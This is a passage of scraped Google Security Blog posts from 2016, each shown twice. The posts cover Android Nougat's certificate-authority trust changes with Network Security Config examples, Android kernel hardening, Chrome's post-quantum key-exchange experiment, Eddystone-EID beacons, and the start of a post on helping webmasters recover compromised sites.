needed. Below are some examples for trusting a custom or user-added CA, in addition to the system CAs. For more examples and details, see  the full documentation .     Trusting custom CAs for debugging  To allow your app to trust custom CAs only for local debugging, include something like this in your Network Security Config. The CAs will only be trusted while your app is marked as debuggable.    &lt;network-security-config&gt;         &lt;debug-overrides&gt;              &lt;trust-anchors&gt;                   &lt;!-- Trust user added CAs while debuggable only --&gt;                 &lt;certificates src=\"user\" /&gt;              &lt;/trust-anchors&gt;         &lt;/domain-config&gt;    &lt;/network-security-config&gt;    Trusting custom CAs for a domain  To allow your app to trust custom CAs for a specific domain, include something like this in your Network Security Config.    &lt;network-security-config&gt;         &lt;domain-config&gt;              &lt;domain includeSubdomains=\"true\"&gt;internal.example.com&lt;/domain&gt;              &lt;trust-anchors&gt;                   &lt;!-- Only trust the CAs included with the app                        for connections to internal.example.com --&gt;                   &lt;certificates src=\"@raw/cas\" /&gt;              &lt;/trust-anchors&gt;         &lt;/domain-config&gt;    &lt;/network-security-config&gt;    Trusting user-added CAs for some domains  To allow your app to trust user-added CAs for multiple domains, include something like this in your Network Security Config.    &lt;network-security-config&gt;         &lt;domain-config&gt;              &lt;domain includeSubdomains=\"true\"&gt;userCaDomain.com&lt;/domain&gt;              &lt;domain includeSubdomains=\"true\"&gt;otherUserCaDomain.com&lt;/domain&gt;              &lt;trust-anchors&gt;                     &lt;!-- Trust preinstalled CAs --&gt;                     &lt;certificates src=\"system\" /&gt;                     &lt;!-- Additionally trust user added CAs --&gt;                     &lt;certificates src=\"user\" /&gt;              &lt;/trust-anchors&gt;         &lt;/domain-config&gt;    &lt;/network-security-config&gt;    Trusting user-added CAs for all domains except some  To allow your app to trust user-added CAs for all domains, except for those specified, include something like this in your Network Security Config.    &lt;network-security-config&gt;         &lt;base-config&gt;              &lt;trust-anchors&gt;                   &lt;!-- Trust preinstalled CAs --&gt;                   &lt;certificates src=\"system\" /&gt;                   &lt;!-- Additionally trust user added CAs --&gt;                   &lt;certificates src=\"user\" /&gt;              &lt;/trust-anchors&gt;         &lt;/base-config&gt;         &lt;domain-config&gt;              &lt;domain includeSubdomains=\"true\"&gt;sensitive.example.com&lt;/domain&gt;              &lt;trust-anchors&gt;                   &lt;!-- Only allow sensitive content to be exchanged                with the real server and not any user or       admin configured MiTMs --&gt;                   &lt;certificates src=\"system\" /&gt;              &lt;trust-anchors&gt;         &lt;/domain-config&gt;    &lt;/network-security-config&gt;    Trusting user-added CAs for all secure connections  To allow your app to trust user-added CAs for all secure connections, add this in your Network Security Config.    &lt;network-security-config&gt;         &lt;base-config&gt;               &lt;trust-anchors&gt;                   &lt;!-- Trust preinstalled CAs --&gt;                   &lt;certificates src=\"system\" /&gt;                   &lt;!-- Additionally trust user added CAs --&gt;                   &lt;certificates src=\"user\" /&gt;              &lt;/trust-anchors&gt;         &lt;/base-config&gt;    &lt;/network-security-config&gt;    Standardized set of system-trusted CAs  To provide a more consistent and more secure experience across the Android ecosystem, beginning with Android Nougat, compatible devices trust only the standardized system CAs maintained in  AOSP .   Previously, the set of preinstalled CAs bundled with the system could vary from device to device. This could lead to compatibility issues when some devices did not include CAs that apps needed for connections as well as potential security issues if CAs that did not meet our security requirements were included on some devices.     What if I have a CA I believe should be included on Android?  First, be sure that your CA needs to be included in the system. The preinstalled CAs are  only  for CAs that meet our security requirements because they affect the secure connections of most apps on the device. If you need to add a CA for connecting to hosts that use that CA, you should instead customize your apps and services that connect to those hosts. For more information, see the  Customizing trusted CAs  section above.   If you operate a CA that you believe should be included in Android, first complete the  Mozilla CA Inclusion Process  and then file a  feature request  against Android to have the CA added to the standardized set of system CAs.                                    Posted by Chad Brubaker, Android Security team   [Cross-posted from the Android Developers Blog] In Android Nougat, we’ve changed how Android handles trusted certificate authorities (CAs) to provide safer defaults for secure app traffic. Most apps and users should not be affected by these changes or need to take any action. The changes include:  Safe and easy APIs to trust custom CAs.  Apps that target API Level 24 and above no longer trust user or admin-added CAs for secure connections, by default.  All devices running Android Nougat offer the same standardized set of system CAs—no device-specific customizations.  For more details on these changes and what to do if you’re affected by them, read on.   Safe and easy APIs Apps have always been able customize which certificate authorities they trust. However, we saw apps making mistakes due to the complexities of the Java TLS APIs. To address this we improved the APIs for customizing trust.   User-added CAs Protection of all application data is a key goal of the Android application sandbox. Android Nougat changes how applications interact with user- and admin-supplied CAs. By default, apps that target API level 24 will—by design—not honor such CAs unless the app explicitly opts in. This safe-by-default setting reduces application attack surface and encourages consistent handling of network and file-based application data.   Customizing trusted CAs Customizing the CAs your app trusts on Android Nougat is easy using the Network Security Config. Trust can be specified across the whole app or only for connections to certain domains, as needed. Below are some examples for trusting a custom or user-added CA, in addition to the system CAs. For more examples and details, see the full documentation.   Trusting custom CAs for debugging To allow your app to trust custom CAs only for local debugging, include something like this in your Network Security Config. The CAs will only be trusted while your app is marked as debuggable.                                                                                                  Trusting custom CAs for a domain To allow your app to trust custom CAs for a specific domain, include something like this in your Network Security Config.                            internal.example.com                                   <!-- Only trust the CAs included with the app                        for connections to internal.example.com -->                                                    Trusting user-added CAs for some domains To allow your app to trust user-added CAs for multiple domains, include something like this in your Network Security Config.                            userCaDomain.com                otherUserCaDomain.com                                                                                                                                        Trusting user-added CAs for all domains except some To allow your app to trust user-added CAs for all domains, except for those specified, include something like this in your Network Security Config.                                                                                                                                                              sensitive.example.com                                   <!-- Only allow sensitive content to be exchanged                with the real server and not any user or       admin configured MiTMs -->                                                    Trusting user-added CAs for all secure connections To allow your app to trust user-added CAs for all secure connections, add this in your Network Security Config.                                                                                                                                             Standardized set of system-trusted CAs To provide a more consistent and more secure experience across the Android ecosystem, beginning with Android Nougat, compatible devices trust only the standardized system CAs maintained in AOSP.  Previously, the set of preinstalled CAs bundled with the system could vary from device to device. This could lead to compatibility issues when some devices did not include CAs that apps needed for connections as well as potential security issues if CAs that did not meet our security requirements were included on some devices.   What if I have a CA I believe should be included on Android? First, be sure that your CA needs to be included in the system. The preinstalled CAs are only for CAs that meet our security requirements because they affect the secure connections of most apps on the device. If you need to add a CA for connecting to hosts that use that CA, you should instead customize your apps and services that connect to those hosts. For more information, see the Customizing trusted CAs section above.  If you operate a CA that you believe should be included in Android, first complete the Mozilla CA Inclusion Process and then file a feature request against Android to have the CA added to the standardized set of system CAs.     ", "date": "July 8, 2016"},
{"website": "Google-Security", "title": "\nProtecting Android with more Linux kernel defenses\n", "author": ["Posted by Jeff Vander Stoep, Android Security team"], "link": "https://security.googleblog.com/2016/07/protecting-android-with-more-linux.html", "abstract": "                             Posted by Jeff Vander Stoep, Android Security team        [Cross-posted from the  Android Developers Blog ]     Android relies heavily on the Linux kernel for enforcement of its security model. To better protect the kernel, we&#8217;ve enabled a number of mechanisms within Android. At a high level these protections are grouped into two categories&#8212;memory protections and attack surface reduction.    Memory Protections    One of the major security features provided by the kernel is memory protection for userspace processes in the form of address space separation. Unlike userspace processes, the kernel&#8217;s various tasks live within one address space and a vulnerability anywhere in the kernel can potentially impact unrelated portions of the system&#8217;s memory. Kernel memory protections are designed to maintain the integrity of the kernel in spite of vulnerabilities.   Mark Memory As Read-Only/No-Execute   This feature segments kernel memory into logical sections and sets restrictive page access permissions on each section. Code is marked as read only + execute. Data sections are marked as no-execute and further segmented into read-only and read-write sections. This feature is enabled with config option CONFIG_DEBUG_RODATA. It was put together by Kees Cook and is based on a subset of  Grsecurity&#8217;s  KERNEXEC feature by Brad Spengler and Qualcomm&#8217;s CONFIG_STRICT_MEMORY_RWX feature by Larry Bassel and Laura Abbott. CONFIG_DEBUG_RODATA landed in the upstream kernel for arm/arm64 and has been backported to Android&#8217;s 3.18+ arm/ arm64  common kernel.   Restrict Kernel Access to User Space   This feature improves protection of the kernel by preventing it from directly accessing userspace memory. This can make a number of attacks more difficult because attackers have significantly less control over kernel memory that is executable, particularly with CONFIG_DEBUG_RODATA enabled. Similar features were already in existence, the earliest being Grsecurity&#8217;s UDEREF. This feature is enabled with config option CONFIG_CPU_SW_DOMAIN_PAN and was implemented by Russell King for ARMv7 and backported to  Android&#8217;s 4.1  kernel by Kees Cook.   Improve Protection Against Stack Buffer Overflows   Much like its predecessor, stack-protector, stack-protector-strong protects against  stack buffer overflows , but additionally provides coverage for  more array types , as the original only protected character arrays. Stack-protector-strong was implemented by Han Shan and  added to the gcc 4.9 compiler .          Attack Surface Reduction    Attack surface reduction attempts to expose fewer entry points to the kernel without breaking legitimate functionality. Reducing attack surface can include removing code, removing access to entry points, or selectively exposing features.   Remove Default Access to Debug Features   The kernel&#8217;s perf system provides infrastructure for performance measurement and can be used for analyzing both the kernel and userspace applications. Perf is a valuable tool for developers, but adds unnecessary attack surface for the vast majority of Android users. In Android Nougat, access to perf will be blocked by default. Developers may still access perf by enabling developer settings and using adb to set a property: &#8220;adb shell setprop security.perf_harden 0&#8221;.  The patchset for blocking access to perf may be broken down into kernel and userspace sections. The  kernel patch  is by  Ben Hutchings  and is derived from Grsecurity&#8217;s CONFIG_GRKERNSEC_PERF_HARDEN by Brad Spengler. The userspace changes were  contributed by Daniel Micay . Thanks to  Wish Wu  and others for responsibly disclosing security vulnerabilities in perf.   Restrict App Access to IOCTL Commands   Much of Android security model is described and enforced by SELinux. The ioctl() syscall represented a major gap in the granularity of enforcement via SELinux.  Ioctl command whitelisting with SELinux  was added as a means to provide per-command control over the ioctl syscall by SELinux.  Most of the kernel vulnerabilities reported on Android occur in drivers and are reached using the ioctl syscall, for example  CVE-2016-0820 . Some ioctl commands are needed by third-party applications, however most are not and access can be restricted without breaking legitimate functionality. In Android Nougat, only a small whitelist of socket ioctl commands are available to applications. For select devices, applications&#8217; access to GPU ioctls has been similarly restricted.   Require SECCOMP-BPF   Seccomp provides an additional sandboxing mechanism allowing a process to restrict the syscalls and syscall arguments available using a configurable filter. Restricting the availability of syscalls can dramatically cut down on the exposed attack surface of the kernel. Since seccomp was first introduced on Nexus devices in Lollipop, its availability across the Android ecosystem has steadily improved. With Android Nougat, seccomp support is a requirement for all devices. On Android Nougat we are using seccomp on the mediaextractor and mediacodec processes as part of the  media hardening effort .          Ongoing Efforts    There are other projects underway aimed at protecting the kernel:       The  Kernel Self Protection Project  is developing runtime and compiler defenses for the upstream kernel.   Further sandbox tightening and attack surface reduction with SELinux is ongoing in AOSP.    Minijail  provides a convenient mechanism for applying many containment and sandboxing features offered by the kernel, including seccomp filters and namespaces.   Projects like  kasan  and  kcov  help fuzzers discover the root cause of crashes and to intelligently construct test cases that increase code coverage&#8212;ultimately resulting in a more efficient bug hunting process.      Due to these efforts and others, we expect the security of the kernel to continue improving. As always, we appreciate feedback on our work and welcome suggestions for how we can improve Android. Contact us at  security@android.com .                                     Posted by Jeff Vander Stoep, Android Security team    [Cross-posted from the Android Developers Blog]  Android relies heavily on the Linux kernel for enforcement of its security model. To better protect the kernel, we’ve enabled a number of mechanisms within Android. At a high level these protections are grouped into two categories—memory protections and attack surface reduction. Memory Protections One of the major security features provided by the kernel is memory protection for userspace processes in the form of address space separation. Unlike userspace processes, the kernel’s various tasks live within one address space and a vulnerability anywhere in the kernel can potentially impact unrelated portions of the system’s memory. Kernel memory protections are designed to maintain the integrity of the kernel in spite of vulnerabilities. Mark Memory As Read-Only/No-Execute This feature segments kernel memory into logical sections and sets restrictive page access permissions on each section. Code is marked as read only + execute. Data sections are marked as no-execute and further segmented into read-only and read-write sections. This feature is enabled with config option CONFIG_DEBUG_RODATA. It was put together by Kees Cook and is based on a subset of Grsecurity’s KERNEXEC feature by Brad Spengler and Qualcomm’s CONFIG_STRICT_MEMORY_RWX feature by Larry Bassel and Laura Abbott. CONFIG_DEBUG_RODATA landed in the upstream kernel for arm/arm64 and has been backported to Android’s 3.18+ arm/arm64 common kernel. Restrict Kernel Access to User Space This feature improves protection of the kernel by preventing it from directly accessing userspace memory. This can make a number of attacks more difficult because attackers have significantly less control over kernel memory that is executable, particularly with CONFIG_DEBUG_RODATA enabled. Similar features were already in existence, the earliest being Grsecurity’s UDEREF. This feature is enabled with config option CONFIG_CPU_SW_DOMAIN_PAN and was implemented by Russell King for ARMv7 and backported to Android’s 4.1 kernel by Kees Cook. Improve Protection Against Stack Buffer Overflows Much like its predecessor, stack-protector, stack-protector-strong protects against stack buffer overflows, but additionally provides coverage for more array types, as the original only protected character arrays. Stack-protector-strong was implemented by Han Shan and added to the gcc 4.9 compiler.  Attack Surface Reduction Attack surface reduction attempts to expose fewer entry points to the kernel without breaking legitimate functionality. Reducing attack surface can include removing code, removing access to entry points, or selectively exposing features. Remove Default Access to Debug Features The kernel’s perf system provides infrastructure for performance measurement and can be used for analyzing both the kernel and userspace applications. Perf is a valuable tool for developers, but adds unnecessary attack surface for the vast majority of Android users. In Android Nougat, access to perf will be blocked by default. Developers may still access perf by enabling developer settings and using adb to set a property: “adb shell setprop security.perf_harden 0”. The patchset for blocking access to perf may be broken down into kernel and userspace sections. The kernel patch is by Ben Hutchings and is derived from Grsecurity’s CONFIG_GRKERNSEC_PERF_HARDEN by Brad Spengler. The userspace changes were contributed by Daniel Micay. Thanks to Wish Wu and others for responsibly disclosing security vulnerabilities in perf. Restrict App Access to IOCTL Commands Much of Android security model is described and enforced by SELinux. The ioctl() syscall represented a major gap in the granularity of enforcement via SELinux. Ioctl command whitelisting with SELinux was added as a means to provide per-command control over the ioctl syscall by SELinux. Most of the kernel vulnerabilities reported on Android occur in drivers and are reached using the ioctl syscall, for example CVE-2016-0820. Some ioctl commands are needed by third-party applications, however most are not and access can be restricted without breaking legitimate functionality. In Android Nougat, only a small whitelist of socket ioctl commands are available to applications. For select devices, applications’ access to GPU ioctls has been similarly restricted. Require SECCOMP-BPF Seccomp provides an additional sandboxing mechanism allowing a process to restrict the syscalls and syscall arguments available using a configurable filter. Restricting the availability of syscalls can dramatically cut down on the exposed attack surface of the kernel. Since seccomp was first introduced on Nexus devices in Lollipop, its availability across the Android ecosystem has steadily improved. With Android Nougat, seccomp support is a requirement for all devices. On Android Nougat we are using seccomp on the mediaextractor and mediacodec processes as part of the media hardening effort.  Ongoing Efforts There are other projects underway aimed at protecting the kernel:   The Kernel Self Protection Project is developing runtime and compiler defenses for the upstream kernel. Further sandbox tightening and attack surface reduction with SELinux is ongoing in AOSP. Minijail provides a convenient mechanism for applying many containment and sandboxing features offered by the kernel, including seccomp filters and namespaces. Projects like kasan and kcov help fuzzers discover the root cause of crashes and to intelligently construct test cases that increase code coverage—ultimately resulting in a more efficient bug hunting process.   Due to these efforts and others, we expect the security of the kernel to continue improving. As always, we appreciate feedback on our work and welcome suggestions for how we can improve Android. Contact us at security@android.com.     ", "date": "July 27, 2016"},
{"website": "Google-Security", "title": "\nExperimenting with Post-Quantum Cryptography\n", "author": ["Posted by Matt Braithwaite, Software Engineer"], "link": "https://security.googleblog.com/2016/07/experimenting-with-post-quantum.html", "abstract": "                             Posted by Matt Braithwaite, Software Engineer   Quantum computers are a fundamentally different sort of computer that take advantage of aspects of quantum physics to solve certain sorts of problems dramatically faster than conventional computers can. While they will, no doubt, be of huge benefit in some areas of study, some of the problems that they are effective at solving are the ones that we use to secure digital communications. Specifically, if large quantum computers can be built then they may be able to break the asymmetric cryptographic primitives that are currently used in TLS, the security protocol behind HTTPS.    Quantum computers exist today but, for the moment, they are small and experimental, containing only a handful of quantum bits. It's not even certain that large machines will ever be built, although  Google ,  IBM ,  Microsoft ,  Intel  and others are working on it. (Adiabatic quantum computers, like the D-Wave computer that Google operates with NASA, can have large numbers of quantum bits, but currently solve fundamentally different problems.)    However, a hypothetical, future quantum computer would be able to retrospectively decrypt any internet communication that was recorded today, and many types of information need to remain confidential for decades. Thus even the possibility of a future quantum computer is something that we should be thinking about today.   Experimenting with Post-quantum cryptography in Chrome   The study of cryptographic primitives that remain secure even against quantum computers is called &#8220;post-quantum cryptography&#8221;. Today we're announcing an experiment in Chrome where a small fraction of connections between desktop Chrome and Google's servers will use a post-quantum key-exchange algorithm in addition to the elliptic-curve key-exchange algorithm that would typically be used. By adding a post-quantum algorithm on top of the existing one, we are able to experiment without affecting user security. The post-quantum algorithm might turn out to be breakable even with today's computers, in which case the elliptic-curve algorithm will still provide the best security that today&#8217;s technology can offer. Alternatively, if the post-quantum algorithm turns out to be secure then it'll protect the connection even against a future, quantum computer.    Our aims with this experiment are to highlight an area of research that Google believes to be important and to gain real-world experience with the larger data structures that post-quantum algorithms will likely require.    We're indebted to Erdem Alkim, Léo Ducas, Thomas Pöppelmann and Peter Schwabe, the researchers who developed &#8220; New Hope &#8221;, the post-quantum algorithm that we selected for this experiment. Their scheme looked to be the most promising post-quantum key-exchange when we investigated in December 2015. Their work builds upon  earlier work  by Bos, Costello, Naehrig and Stebila, and also on  work  by Lyubashevsky, Peikert and Regev.    We explicitly do not wish to make our selected post-quantum algorithm a de-facto standard. To this end we plan to discontinue this experiment within two years, hopefully by replacing it with something better. Since we selected New Hope, we've noted two  promising   papers  in this space, which are welcome. Additionally, Google researchers, in collaboration with researchers from NXP, Microsoft, Centrum Wiskunde &amp; Informatica and McMaster University, have just published  another paper  in this area. Practical research papers, such as these, are critical if cryptography is to have real-world impact.    This experiment is currently enabled in  Chrome Canary  and you can tell whether it's being used by opening the recently introduced  Security Panel  and looking for &#8220;CECPQ1&#8221;, for example on  https://play.google.com/store . Not all Google domains will have it enabled and the experiment may appear and disappear a few times if any issues are found.           While it's still very early days for quantum computers, we're excited to begin preparing for them, and to help ensure our users' data will remain secure long into the future.                                                Posted by Matt Braithwaite, Software Engineer Quantum computers are a fundamentally different sort of computer that take advantage of aspects of quantum physics to solve certain sorts of problems dramatically faster than conventional computers can. While they will, no doubt, be of huge benefit in some areas of study, some of the problems that they are effective at solving are the ones that we use to secure digital communications. Specifically, if large quantum computers can be built then they may be able to break the asymmetric cryptographic primitives that are currently used in TLS, the security protocol behind HTTPS.  Quantum computers exist today but, for the moment, they are small and experimental, containing only a handful of quantum bits. It's not even certain that large machines will ever be built, although Google, IBM, Microsoft, Intel and others are working on it. (Adiabatic quantum computers, like the D-Wave computer that Google operates with NASA, can have large numbers of quantum bits, but currently solve fundamentally different problems.)  However, a hypothetical, future quantum computer would be able to retrospectively decrypt any internet communication that was recorded today, and many types of information need to remain confidential for decades. Thus even the possibility of a future quantum computer is something that we should be thinking about today. Experimenting with Post-quantum cryptography in Chrome The study of cryptographic primitives that remain secure even against quantum computers is called “post-quantum cryptography”. Today we're announcing an experiment in Chrome where a small fraction of connections between desktop Chrome and Google's servers will use a post-quantum key-exchange algorithm in addition to the elliptic-curve key-exchange algorithm that would typically be used. By adding a post-quantum algorithm on top of the existing one, we are able to experiment without affecting user security. The post-quantum algorithm might turn out to be breakable even with today's computers, in which case the elliptic-curve algorithm will still provide the best security that today’s technology can offer. Alternatively, if the post-quantum algorithm turns out to be secure then it'll protect the connection even against a future, quantum computer.  Our aims with this experiment are to highlight an area of research that Google believes to be important and to gain real-world experience with the larger data structures that post-quantum algorithms will likely require.  We're indebted to Erdem Alkim, Léo Ducas, Thomas Pöppelmann and Peter Schwabe, the researchers who developed “New Hope”, the post-quantum algorithm that we selected for this experiment. Their scheme looked to be the most promising post-quantum key-exchange when we investigated in December 2015. Their work builds upon earlier work by Bos, Costello, Naehrig and Stebila, and also on work by Lyubashevsky, Peikert and Regev.  We explicitly do not wish to make our selected post-quantum algorithm a de-facto standard. To this end we plan to discontinue this experiment within two years, hopefully by replacing it with something better. Since we selected New Hope, we've noted two promising papers in this space, which are welcome. Additionally, Google researchers, in collaboration with researchers from NXP, Microsoft, Centrum Wiskunde & Informatica and McMaster University, have just published another paper in this area. Practical research papers, such as these, are critical if cryptography is to have real-world impact.  This experiment is currently enabled in Chrome Canary and you can tell whether it's being used by opening the recently introduced Security Panel and looking for “CECPQ1”, for example on https://play.google.com/store. Not all Google domains will have it enabled and the experiment may appear and disappear a few times if any issues are found.    While it's still very early days for quantum computers, we're excited to begin preparing for them, and to help ensure our users' data will remain secure long into the future.        ", "date": "July 7, 2016"},
{"website": "Google-Security", "title": "\nGrowing Eddystone with Ephemeral Identifiers: A Privacy Aware & Secure Open Beacon Format\n", "author": ["Posted by ", "Nirdhar Khazanie, Product Manager\n    and ", "Yossi Matias, VP\n    Engineering"], "link": "https://security.googleblog.com/2016/04/growing-eddystone-with-ephemeral-identifiers.html", "abstract": "                             Posted by&nbsp;  Nirdhar Khazanie, Product Manager     and&nbsp;  Yossi Matias, VP     Engineering     Last July, we       launched  Eddystone, an open and extensible Bluetooth Low Energy (BLE)     beacon format from Google, supported by Android, iOS, and Chrome. Beacons     mark important places and objects in a way that your phone can understand.     To do this, they typically broadcast public one-way signals &#8210; such as an     Eddystone-UID or -URL.    Today, we're introducing Ephemeral IDs (EID), a beacon frame in the     Eddystone format that gives developers more power to control who can make     use of the beacon signal. Eddystone-EID enables a new set of use cases     where it is important for users to be able to exchange information securely     and privately. Since the beacon frame changes periodically, the signal is     only useful to clients with access to a resolution service that maps the     beacon&#8217;s current identifier to stable data. In other words, the signal is     only recognizable to a controlled set of users. In this post we&#8217;ll provide     a bit more detail about this feature, as well as Google&#8217;s implementation of      Eddystone-EID      with Google Cloud Platform&#8217;s  Proximity Beacon     API  and the Nearby API for Android and CocoaPod for iOS.       Technical Specifications     To an observer of an Eddystone-EID beacon, the AES-encrypted     eight byte beacon identifier changes pseudo-randomly with an average period     that is set by the developer &#8210; over a range from 1 second to just over 9     hours. The identifier is generated using a key and timer running on the     beacon. When the beacon is provisioned, or set up, the key is generated and     exchanged with a resolution service such as Proximity Beacon API using an     Elliptic Curve Diffie-Hellman key agreement  protocol ,     and the timer is synchronized with the service. This way, only the beacon     and the service that it is registered with have access to the key. You can     read more about the technical details of Eddystone-EID from the  specification      &#8210; including the provisioning process &#8210; on GitHub, or from our recent          preprint .    An Eddystone-EID contains measures designed to prevent a variety of nuanced     attacks. For example, the rotation period for a single beacon varies     slightly from identifier to identifier, meaning that an attacker cannot use     a consistent period to identify a particular beacon. Eddystone-EID also     enables safety features such as proximity awareness, device authentication,     and data encryption on packet transmission. The       Eddystone-TLM  frame has also been extended with a new version that     broadcasts battery level also encrypted with the shared key, meaning that     an attacker cannot use the battery level as an identifying feature     either.    When correctly implemented and combined with a service that supports a     range of access control checks, such as Proximity Beacon API, this pattern     has several advantages:     The beacon&#8217;s location cannot be spoofed, except by a real-time         relay of the beacon signal. This makes it ideal for use cases where a         developer wishes to enable premium features for a user at a         location.   Beacons provide a high-quality and precise location signal that is         valuable to the deployer. Eddystone-EID enables deployers to decide         which developers/businesses can make use of that signal.   Eddystone-EID beacons can be integrated into devices that users         carry with them without leaving users vulnerable to tracking.       Integrating Seamlessly with the Google Beacon Platform     Launching today on           Android  and           iOS , is a new addition to the wider Google beacon platform: Beacon         Tools. Beacon Tools allows you to provision and register an         Eddystone-EID beacon, as well as associate content with your beacon         through the Google Cloud Platform.    In addition to Eddystone-EID and the new encrypted version of the         previously available Eddystone-TLM, we&#8217;re also adding a common         configuration protocol to the Eddystone family. The           Eddystone GATT service  allows any Eddystone beacon to be         provisioned by any tool that supports the protocol. This encourages the         development of an open ecosystem of beacon products, both in hardware         and software, removing restrictions for developers.       Eddystone-EID Support in the Beacon Industry     We&#8217;re excited to have worked with a variety of industry players as         Eddystone-EID develops. Over the past year, Eddystone  manufacturers          in the beacon space have grown from 5 to over 25. The following 15         manufacturers will be supporting Eddystone-EID, with more to follow:                                    Accent Systems               Bluvision               Reco/Perples                    Beacon Inside             Estimote             Sensoro                   Blesh             Gimbal             Signal360                   BlueBite             Nordic             Swirl                   Bluecats             Radius Networks             Zebra                                      In addition to beacon manufacturers, we&#8217;ve been working with a range of         innovative companies to demonstrate Eddystone-EID in a variety of         different scenarios.                         Samsonite  and                  Accent Systems  have                 developed a suitcase with Eddystone-EID where users can                 securely keep track of their personal luggage.                                  K11  is a Hong Kong                 museum and retail experience using  Sensoro  Eddystone-EID                 beacons for visitor tours and customer promotions.                                  Monumental                 Sports  in Washington, DC, uses  Radius Networks                  Eddystone-EID beacons for delivering customer rewards during                 Washington Wizards and Capitals sporting events.                                  Sparta Digital                  has produced an app called Buzzin that uses Eddystone-EID                 beacons deployed in Manchester, UK to enable a more seamless                 transit experience.    You can get started with Eddystone-EID by creating a Google Cloud             Platform project and purchasing compatible hardware through one of             our               manufacturers . Best of all, Eddystone-EID works transparently             to beacon subscriptions created through the Google Play Services             Nearby Messages API, allowing you to run combined networks of             Eddystone-EID and Eddystone-UID transparently in your client code!                                         Posted by Nirdhar Khazanie, Product Manager     and Yossi Matias, VP     Engineering  Last July, we      launched Eddystone, an open and extensible Bluetooth Low Energy (BLE)     beacon format from Google, supported by Android, iOS, and Chrome. Beacons     mark important places and objects in a way that your phone can understand.     To do this, they typically broadcast public one-way signals ‒ such as an     Eddystone-UID or -URL.  Today, we're introducing Ephemeral IDs (EID), a beacon frame in the     Eddystone format that gives developers more power to control who can make     use of the beacon signal. Eddystone-EID enables a new set of use cases     where it is important for users to be able to exchange information securely     and privately. Since the beacon frame changes periodically, the signal is     only useful to clients with access to a resolution service that maps the     beacon’s current identifier to stable data. In other words, the signal is     only recognizable to a controlled set of users. In this post we’ll provide     a bit more detail about this feature, as well as Google’s implementation of     Eddystone-EID     with Google Cloud Platform’s Proximity Beacon     API and the Nearby API for Android and CocoaPod for iOS.  Technical Specifications  To an observer of an Eddystone-EID beacon, the AES-encrypted     eight byte beacon identifier changes pseudo-randomly with an average period     that is set by the developer ‒ over a range from 1 second to just over 9     hours. The identifier is generated using a key and timer running on the     beacon. When the beacon is provisioned, or set up, the key is generated and     exchanged with a resolution service such as Proximity Beacon API using an     Elliptic Curve Diffie-Hellman key agreement protocol,     and the timer is synchronized with the service. This way, only the beacon     and the service that it is registered with have access to the key. You can     read more about the technical details of Eddystone-EID from the specification     ‒ including the provisioning process ‒ on GitHub, or from our recent         preprint.  An Eddystone-EID contains measures designed to prevent a variety of nuanced     attacks. For example, the rotation period for a single beacon varies     slightly from identifier to identifier, meaning that an attacker cannot use     a consistent period to identify a particular beacon. Eddystone-EID also     enables safety features such as proximity awareness, device authentication,     and data encryption on packet transmission. The      Eddystone-TLM frame has also been extended with a new version that     broadcasts battery level also encrypted with the shared key, meaning that     an attacker cannot use the battery level as an identifying feature     either.  When correctly implemented and combined with a service that supports a     range of access control checks, such as Proximity Beacon API, this pattern     has several advantages:  The beacon’s location cannot be spoofed, except by a real-time         relay of the beacon signal. This makes it ideal for use cases where a         developer wishes to enable premium features for a user at a         location. Beacons provide a high-quality and precise location signal that is         valuable to the deployer. Eddystone-EID enables deployers to decide         which developers/businesses can make use of that signal. Eddystone-EID beacons can be integrated into devices that users         carry with them without leaving users vulnerable to tracking.   Integrating Seamlessly with the Google Beacon Platform  Launching today on          Android and          iOS, is a new addition to the wider Google beacon platform: Beacon         Tools. Beacon Tools allows you to provision and register an         Eddystone-EID beacon, as well as associate content with your beacon         through the Google Cloud Platform.  In addition to Eddystone-EID and the new encrypted version of the         previously available Eddystone-TLM, we’re also adding a common         configuration protocol to the Eddystone family. The          Eddystone GATT service allows any Eddystone beacon to be         provisioned by any tool that supports the protocol. This encourages the         development of an open ecosystem of beacon products, both in hardware         and software, removing restrictions for developers.  Eddystone-EID Support in the Beacon Industry  We’re excited to have worked with a variety of industry players as         Eddystone-EID develops. Over the past year, Eddystone manufacturers         in the beacon space have grown from 5 to over 25. The following 15         manufacturers will be supporting Eddystone-EID, with more to follow:                  Accent Systems       Bluvision       Reco/Perples           Beacon Inside       Estimote       Sensoro           Blesh       Gimbal       Signal360           BlueBite       Nordic       Swirl           Bluecats       Radius Networks       Zebra                   In addition to beacon manufacturers, we’ve been working with a range of         innovative companies to demonstrate Eddystone-EID in a variety of         different scenarios.                    Samsonite and                 Accent Systems have                 developed a suitcase with Eddystone-EID where users can                 securely keep track of their personal luggage.                               K11 is a Hong Kong                 museum and retail experience using Sensoro Eddystone-EID                 beacons for visitor tours and customer promotions.                               Monumental                 Sports in Washington, DC, uses Radius Networks                 Eddystone-EID beacons for delivering customer rewards during                 Washington Wizards and Capitals sporting events.                               Sparta Digital                 has produced an app called Buzzin that uses Eddystone-EID                 beacons deployed in Manchester, UK to enable a more seamless                 transit experience.  You can get started with Eddystone-EID by creating a Google Cloud             Platform project and purchasing compatible hardware through one of             our              manufacturers. Best of all, Eddystone-EID works transparently             to beacon subscriptions created through the Google Play Services             Nearby Messages API, allowing you to run combined networks of             Eddystone-EID and Eddystone-UID transparently in your client code!       ", "date": "April 14, 2016"},
{"website": "Google-Security", "title": "\nHelping webmasters re-secure their sites\n", "author": ["Posted by Kurt Thomas and Yuan Niu, Spam & Abuse Research"], "link": "https://security.googleblog.com/2016/04/helping-webmasters-re-secure-their-sites.html", "abstract": "                             Posted by Kurt Thomas and Yuan Niu, Spam &amp; Abuse Research   Every week,  over 10 million users encounter harmful websites  that deliver malware and scams. Many of these sites are compromised personal blogs or small business pages that have fallen victim due to a weak password or outdated software. Safe Browsing and Google Search protect visitors from dangerous content by displaying browser warnings and labeling search results with  'this site may harm your computer' . While this helps keep users safe in the moment, the compromised site remains a problem that needs to be fixed.    Unfortunately, many webmasters for compromised sites are unaware anything is amiss. Worse yet, even when they learn of an incident, they may lack the security expertise to take action and address the root cause of compromise. Quoting one webmaster from a survey we conducted, &#8220;our daily and weekly backups were both infected&#8221; and even after seeking the help of a specialist, after &#8220;lots of wasted hours/days&#8221; the webmaster abandoned all attempts to restore the site and instead refocused his efforts on &#8220;rebuilding the site from scratch&#8221;.    In order to find the best way to help webmasters clean-up from compromise, we recently teamed up with the University of California, Berkeley to explore how to quickly contact webmasters and expedite recovery while minimizing the distress involved. We&#8217;ve summarized our key lessons below. The full study, which you can read  here , was recently presented at the  International World Wide Web Conference .    When Google works directly with webmasters during critical moments like security breaches, we can help 75% of webmasters re-secure their content. The whole process takes a median of 